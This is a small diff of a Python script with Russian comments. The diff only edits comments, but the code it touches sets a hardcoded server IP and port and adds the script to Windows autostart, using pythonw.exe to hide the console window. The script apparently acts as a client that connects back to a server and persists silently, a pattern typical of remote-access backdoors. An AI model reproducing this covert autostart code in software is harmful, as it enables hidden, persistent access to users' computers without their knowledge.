@@ -4,7 +4,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.100.3"  # Жёстко заданный IP
+SERVER_IP = "192.168.100.3"  # Укажи IP сервера
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
@@ -27,7 +27,6 @@ def add_to_autostart_windows():
     try:
         exe_path = sys.executable
         script_path = os.path.abspath(__file__)
-        # Используем pythonw.exe, если он есть, чтобы не показывалось окно консоли
         if exe_path.lower().endswith("python.exe"):
             pythonw_path = exe_path[:-4] + "w.exe"
             if os.path.exists(pythonw_path):
